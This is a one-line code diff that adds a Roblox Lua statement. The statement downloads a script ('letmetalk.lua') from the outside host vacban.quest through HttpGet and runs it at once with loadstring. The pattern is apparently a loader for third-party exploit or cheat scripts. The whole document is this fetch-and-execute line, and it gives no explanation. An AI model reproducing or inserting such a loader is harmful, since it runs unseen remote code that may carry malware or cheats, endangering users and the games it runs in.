@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vacban.quest/letmetalk.lua", true))()
